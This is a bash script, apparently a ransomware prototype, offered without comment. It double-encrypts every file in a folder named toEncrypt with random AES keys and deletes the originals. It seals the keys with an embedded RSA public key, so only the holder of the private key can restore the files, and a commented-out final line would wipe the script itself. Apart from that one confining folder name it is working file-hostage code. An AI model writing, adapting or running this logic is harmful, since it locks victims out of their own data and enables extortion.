#!/bin/bash

cd toEncrypt
rm -f *.enc ||:

{ 
echo '-----BEGIN PUBLIC KEY-----'
echo 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7JEZW8vvcPStkMVPsUei'
echo 'B7dH9ir3EffcFp3PWgHIk8wqeo5oAVtbQ4rUF73YoDjacv1uLiIgX50rZlUtu0aU'
echo 'yafL5nnxRpMPLpg8s9Eu2TRcghBNPEURk/oaE7yURBdEs69pI95e55NRnmRTFjU2'
echo '/gqjYh3ywYtGy82rM9dJW1jJeZUoXSEwH+8GHuVNbr01AlqvlBpoZi8ARcAHREaK'
echo 'pJ3XiyHRMNv5xF2RsLUoRRXvGJt4AmQELHISfy7YNBMOHFUmB9FROl1AtEtS1n2W'
echo 'E4X3bGJ/GabRqjqS5Q6ndx4MibUAE0KXRDNFQmrAVDx+y2AaKB1X26nys1RBym6N'
echo 'NQIDAQAB'
echo '-----END PUBLIC KEY-----'
} > publicKey.enc

encDictionaryFile=`openssl rand -hex 30`.enc
touch $encDictionaryFile 

for i in * ; do 
	if [[ ( -f "$i" ) && ( "$i" != *".ecn" ) && ( "$i" != *".enc" )  ]]; then
		
		encryptedFileName=`openssl rand -hex 30`
		firstPhaseKey=`openssl rand -hex 30`
		secondPhaseKey=`openssl rand -hex 30`

		openssl aes-256-cbc -a -salt -pbkdf2 -in $i -out $encryptedFileName -k $firstPhaseKey && rm $i
		openssl aes-256-cbc -a -salt -pbkdf2 -in $encryptedFileName -out $encryptedFileName.ecn -k $secondPhaseKey && rm $encryptedFileName

		echo "$i;$firstPhaseKey;$secondPhaseKey;$encryptedFileName" | openssl rsautl -encrypt -inkey publicKey.enc -pubin  | base64 -w 100000 >> $encDictionaryFile

	fi
done

rm publicKey.enc

cd - > /dev/null

# nohup cat /dev/zero > $0
